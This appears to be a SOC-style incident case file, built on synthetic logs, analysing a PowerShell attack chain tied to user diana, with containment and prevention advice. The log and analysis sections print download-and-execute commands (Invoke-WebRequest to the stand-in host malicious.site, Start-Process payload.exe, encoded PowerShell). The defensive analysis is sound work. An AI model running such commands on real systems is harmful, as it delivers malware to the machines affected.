🟦 Case File: Suspicious PowerShell Activity — User diana
🟩 Summary
User diana logged in successfully and immediately executed multiple high‑risk PowerShell commands, including:

downloading a payload

executing the payload

running encoded PowerShell

spawning a suspicious process (payload.exe)

This behavior strongly indicates a PowerShell‑based attack, commonly used in malware delivery, lateral movement, and post‑exploitation frameworks.

🟩 Evidence (from dashboard visualization)
Event counts
Successful Logins (4624): 1

PowerShell ScriptBlock Logs (4104): 3

Processes Created (4688): 1

Privilege Escalations (4672): 0

Failed Logins (4625): 0

Observed patterns
Donut chart shows a dominant yellow slice (PowerShell activity).

Bar chart highlights multiple 4104 events in rapid succession.

Cards show low login activity but high script execution, which is abnormal.

Raw log evidence
From fake_data/powershell_attack.json:

Code
4624 - Successful login for user diana
4104 - PowerShell ScriptBlock: Invoke-WebRequest http://malicious.site/payload.exe
4104 - PowerShell ScriptBlock: Start-Process payload.exe
4104 - PowerShell ScriptBlock: powershell.exe -enc UwBFAEMAUgBFAFQAUwA=
4688 - Process created: payload.exe
🟩 Analysis
🔹 Step 1 — Successful login
User diana logs in normally.
No anomalies yet.

🔹 Step 2 — Malicious download
Invoke-WebRequest http://malicious.site/payload.exe

This command downloads a file from a non‑trusted external domain, which is a common malware delivery technique.

🔹 Step 3 — Payload execution
Start-Process payload.exe

The downloaded file is executed immediately — a strong indicator of compromise.

🔹 Step 4 — Encoded PowerShell
powershell.exe -enc UwBFAEMAUgBFAFQAUwA=

Encoded commands are used to:

hide malicious intent

bypass detection

execute obfuscated scripts

This is one of the clearest signs of malicious PowerShell activity.

🔹 Step 5 — Process creation
payload.exe is spawned as a new process:

Could be malware

Could be a dropper

Could be a persistence agent

🔹 Combined behavior
This sequence is a classic PowerShell attack chain:

Download payload

Execute payload

Run encoded PowerShell

Spawn malicious process

This is not normal user behavior and strongly suggests compromise.

🟩 Potential Impact
If successful, the attacker could:

deploy malware

steal credentials

escalate privileges

move laterally

exfiltrate data

create persistence

disable security tools

PowerShell attacks are often used in fileless malware, making them harder to detect.

🟩 Recommended Actions
Immediate
Isolate the host to prevent lateral movement

Terminate malicious processes (payload.exe, PowerShell instances)

Block the malicious domain (malicious.site)

Delete downloaded payloads

Review network logs for outbound connections

Scan for persistence mechanisms (registry, scheduled tasks)

Investigative
Decode the PowerShell payload

Analyze payload.exe

Review ScriptBlock logs for additional commands

Check for other 4104 events

Inspect user diana’s recent activity

Review EDR logs for suspicious PowerShell usage

Preventive
Enable PowerShell ScriptBlock Logging

Restrict PowerShell execution policies

Deploy EDR rules for encoded PowerShell

Block PowerShell for non‑admin users

Enforce application whitelisting (AppLocker)

🟩 Case Status
Confirmed suspicious PowerShell activity  
Likely part of a malware delivery or post‑exploitation chain.
Immediate containment recommended.
